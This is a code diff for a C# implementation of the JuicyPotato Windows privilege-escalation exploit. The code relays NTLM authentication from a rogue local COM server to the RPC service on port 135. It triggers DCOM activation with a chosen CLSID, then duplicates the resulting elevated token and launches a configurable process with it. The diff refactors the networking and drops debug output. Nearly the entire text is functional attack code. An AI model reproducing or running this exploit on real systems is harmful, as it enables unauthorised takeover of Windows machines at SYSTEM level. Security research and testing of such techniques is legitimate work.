@@ -1,6 +1,6 @@
 ﻿using System.Collections.Concurrent;
+using System.Diagnostics;
 using System.Net;
-using System.Net.Sockets;
 using System.Text;
 using Vanara.InteropServices;
 using Vanara.PInvoke;
@@ -13,18 +13,21 @@ namespace sharp_potato;
 
 public class JuicyPotato
 {
-    public bool EnableDebugLogging { get; set; } = false;
     public Guid CLSID { get; set; } = Guid.Parse("03ca98d6-ff5d-49b8-abc6-03dd84127020");
     public IPEndPoint ComServerEndPoint { get; set; } = new(IPAddress.Loopback, 1337);
     public IPEndPoint RpcServerEndPoint { get; set; } = new(IPAddress.Loopback, 135);
     public LocalNegotiator Negotiator { get; } = new();
+    public ProcessStartInfo ProcessStartInfo { get; set; } = new();
 
-    private const int BUFFER_LENGTH = 4096;
     private readonly BlockingCollection<byte[]> queueSendCom = new();
     private readonly BlockingCollection<byte[]> queueSendRpc = new();
     private Thread comListenerThread;
     private Thread rpcConnectionThread;
     private bool newConnection;
+    private CancellationTokenSource cancellationTokenSource = new();
+
+    private ComServer comServer;
+    private RpcClient rpcClient;
 
     public void StartRPCConnectionThread()
     {
@@ -40,116 +43,48 @@ public class JuicyPotato
 
     private void StartCOMListener()
     {
-        if (EnableDebugLogging)
-            Console.Write($"COM> startCOMListener ({ComServerEndPoint.Port})\n");
+        comServer = new ComServer(ComServerEndPoint);
+        comServer.Start();
 
-        var listener = new TcpListener(ComServerEndPoint);
-        listener.Start();
-
-        var client = listener.AcceptTcpClient();
-
-        var receiveBuffer = new byte[BUFFER_LENGTH];
-        int iResult;
-        do
+        while (true)
         {
-            iResult = client.GetStream().Read(receiveBuffer, 0, BUFFER_LENGTH);
-            if (EnableDebugLogging)
-                Console.Write($"COM> Read result: {iResult} from COM (1337 <- COM)\n");
-            if (iResult > 0)
-            {
-                var receiveBufferClone = ProcessNtlmBytes(receiveBuffer[..iResult]);
+            var dataRead = comServer.Read();
+            if (dataRead == null)
+                break;
 
-                if (EnableDebugLogging)
-                    Console.Write($"COM> Adding {iResult}/{receiveBufferClone.Length} bytes to RPC_Queue\n");
-                queueSendRpc.Add(receiveBufferClone);
+            dataRead = ProcessNtlmBytes(dataRead);
+            queueSendRpc.Add(dataRead);
 
-                var buffer = queueSendCom.Take();
-                if (EnableDebugLogging)
-                    Console.Write($"COM> Popped {buffer.Length} bytes from COM_Queue\n");
+            var buffer = queueSendCom.Take();
+            buffer = ProcessNtlmBytes(buffer);
+            comServer.Write(buffer);
 
-                buffer = ProcessNtlmBytes(buffer);
+            newConnection = comServer.CheckForNewConnections();
+        }
 
-                if (EnableDebugLogging)
-                    Console.Write($"COM> Sending {buffer.Length} bytes to COM (1337 -> COM)\n");
-                client.GetStream().Write(buffer, 0, buffer.Length);
-
-                Thread.Sleep(10);
-                newConnection = listener.Pending();
-                if (newConnection)
-                {
-                    if (EnableDebugLogging)
-                        Console.Write("COM> New TCP connection is pending, accepting.\n");
-                    client.Close();
-                    client = listener.AcceptTcpClient();
-                }
-            }
-            else if (iResult == 0)
-            {
-                client.Close();
-                Environment.Exit(-1);
-            }
-            else
-            {
-                Console.Write($"COM> ERR: recv failed with error: {iResult}\n");
-                client.Close();
-                Environment.Exit(-1);
-            }
-        } while (iResult > 0);
-
-        client.Close();
+        comServer.Stop();
     }
 
     private void StartRPCConnection()
     {
-        if (EnableDebugLogging)
-            Console.Write("                                             RPC> startRPCConnection\n");
+        rpcClient = new RpcClient(RpcServerEndPoint);
+        rpcClient.Connect();
 
-        var client = new TcpClient();
-        client.Connect(RpcServerEndPoint);
-
-        byte[] receiveBuffer = new byte[BUFFER_LENGTH];
-        int iResult;
-        do
+        while (true)
         {
-            var buffer = queueSendRpc.Take();
-            if (EnableDebugLogging)
-                Console.Write($"                                             RPC> Popped item from RPC_Queue ({buffer.Length} bytes)\n");
-
-            if (newConnection)
+            try
             {
-                if (EnableDebugLogging)
-                    Console.Write("                                             RPC> startRPCConnection -> newConnection was 1\n");
-                client = new TcpClient();
-                client.Connect(RpcServerEndPoint);
-                newConnection = false;
+                var buffer = queueSendRpc.Take(cancellationTokenSource.Token);
+                rpcClient.ReconnectIfNeeded(ref newConnection);
+                rpcClient.Write(buffer);
+                buffer = rpcClient.Read();
+                queueSendCom.Add(buffer);
             }
-
-            if (EnableDebugLogging)
-                Console.Write($"                                             RPC> Writing {buffer.Length} bytes to RDP (this -> 135)\n");
-            client.GetStream().Write(buffer, 0, buffer.Length);
-
-            iResult = client.GetStream().Read(receiveBuffer, 0, BUFFER_LENGTH);
-            if (EnableDebugLogging)
-                Console.Write($"                                             RPC> Read {iResult} bytes from RDP (this <- 135)\n");
-            if (iResult > 0)
+            catch
             {
-                if (EnableDebugLogging)
-                    Console.Write($"                                             RPC> Adding {iResult} bytes to COM_Queue\n");
-                queueSendCom.Add(receiveBuffer[..iResult]);
+                break;
             }
-            else if (iResult == 0)
-            {
-                if (EnableDebugLogging)
-                    Console.Write("                                             RPC> Connection closed\n");
-            }
-            else
-            {
-                Console.Write($"                                             RPC> ERR: recv failed with error: {iResult}\n");
-                return;
-            }
-        } while (iResult > 0);
-
-        client.Close();
+        }
     }
 
     private static int FindNTLMBytes(byte[] data)
@@ -180,8 +115,6 @@ public class JuicyPotato
             return data;
 
         int messageType = data[ntlmLoc + 8];
-        if (EnableDebugLogging)
-            Console.Write($"[NTLM/{data.Length}] Will handle {data.Length - ntlmLoc} bytes starting from {ntlmLoc} (type = {messageType})\n");
         switch (messageType)
         {
             case 1: return data[..ntlmLoc].Concat(Negotiator.HandleType1(data[ntlmLoc..])).ToArray();
@@ -195,9 +128,6 @@ public class JuicyPotato
 
     public void TriggerDCOM()
     {
-        if (EnableDebugLogging)
-            Console.Out.WriteLine("TriggerDCOM");
-
         CoInitialize(IntPtr.Zero);
         CreateILockBytesOnHGlobal(IntPtr.Zero, true, out var lb);
         StgCreateDocfileOnILockBytes(lb, STGM.STGM_CREATE | STGM.STGM_READWRITE | STGM.STGM_SHARE_EXCLUSIVE, 0, out var stg);
@@ -216,21 +146,19 @@ public class JuicyPotato
         };
 
         CoGetInstanceFromIStorage(null, CLSID, null, CLSCTX.CLSCTX_LOCAL_SERVER, t, 1, qis);
-
-        if (EnableDebugLogging)
-            Console.Out.WriteLine("TriggerDCOM End");
     }
 
     public void WaitForAuth()
     {
         while (Negotiator.AuthResult != 0)
             Thread.Sleep(100);
+        cancellationTokenSource.Cancel();
     }
 
-    public bool CreateProcess()
+    public SafePROCESS_INFORMATION CreateProcess()
     {
         if (!OpenProcessToken(GetCurrentProcess(), TokenAccess.TOKEN_ALL_ACCESS, out var hToken))
-            return false;
+            return null;
 
         EnablePrivilege(hToken, "SeImpersonatePrivilege");
         EnablePrivilege(hToken, "SeAssignPrimaryTokenPrivilege");
@@ -238,23 +166,17 @@ public class JuicyPotato
         QuerySecurityContextToken(Negotiator.Context, out var elevatedToken);
         // IsTokenSystem(hToken); // TODO
 
-        var tokenType = elevatedToken.GetInfo<TOKEN_TYPE>();
-        if (EnableDebugLogging)
-            Console.Out.WriteLine(tokenType);
-
         DuplicateTokenEx(elevatedToken, TokenAccess.TOKEN_ALL_ACCESS, null,
             SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out var dupedToken);
 
-        tokenType = dupedToken.GetInfo<TOKEN_TYPE>();
-        if (EnableDebugLogging)
-            Console.Out.WriteLine(tokenType);
+        var startupInfo = new STARTUPINFO();
+        startupInfo.lpDesktop = "winsta0\\default";
 
-        CreateProcessWithTokenW(dupedToken, 0, "cmd.exe", new StringBuilder("cmd.exe"),
-            0, null, null, new STARTUPINFO {lpDesktop = "winsta0\\default"}, out var processInformation);
+        CreateProcessWithTokenW(dupedToken, 0, ProcessStartInfo.FileName,
+            new StringBuilder($"{ProcessStartInfo.FileName} {ProcessStartInfo.Arguments}"),
+            0, null, null, startupInfo, out var processInformation);
 
-        Console.Out.WriteLine("PID=" + processInformation.dwProcessId);
-
-        return false;
+        return processInformation;
     }
 
     private bool EnablePrivilege(SafeHTOKEN token, string privilege)
